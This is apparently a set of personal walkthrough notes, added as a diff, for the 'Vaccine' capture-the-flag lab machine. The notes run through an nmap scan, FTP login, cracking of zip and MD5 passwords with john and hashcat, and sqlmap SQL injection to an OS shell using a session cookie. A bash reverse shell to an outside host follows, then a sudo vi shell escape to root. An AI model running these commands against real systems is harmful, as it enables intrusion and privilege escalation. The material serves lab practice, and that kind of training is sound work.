@@ -1,0 +1,62 @@
+nmap  -sC -sV 10.10.10.46
+
+Ftp 10.10.10.46
+
+Username: ftpuser
+Password: mc@F1l3ZilL4
+
+Get backup.zip 
+
+sudo zip2john backup.zip > backup_hash
+
+sudo john backup_hash --fork=10 -w= /home/silentaffinity/wordlists/rockyou.txt
+
+sudo john backup_hash --show
+
+Zip pass : 741852963
+
+Cat Index.php
+
+MD5 Hash : 2cb42f8734ea607eefed3b70af13bbd3
+
+sudo hashcat -m 0 index_md5 rockyou.txt
+
+MD5 cracked : qwerty789
+
+Login to browser 
+
+USERNAME : admin
+PASSWORD : qwerty789
+
+Run burpsuite to get admin cookie
+
+sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' --
+
+cookie='PHPSESSID=v34d80qtodmd39kfm9qfcedfrv' --os-shell
+
+bash -c 'bash -i >& /dev/tcp/10.10.14.239 /9001 0>&1'
+
+SHELL=/bin/bash script -q /dev/null
+
+ $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
+
+ssh postgres@10.10.10.46
+Pass: P@s5w0rd!
+
+postgres@vaccine:/etc/postgresql/11/main$ sudo -l
+Matching Defaults entries for postgres on vaccine:
+
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User postgres may run the following commands on vaccine:
+    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
+
+sudo /etc/postgresql/11/main/pg_hba.conf
+
+:set shell=/bin/sh
+:shell
+
+Root access
+
+Flag in root Directory
+
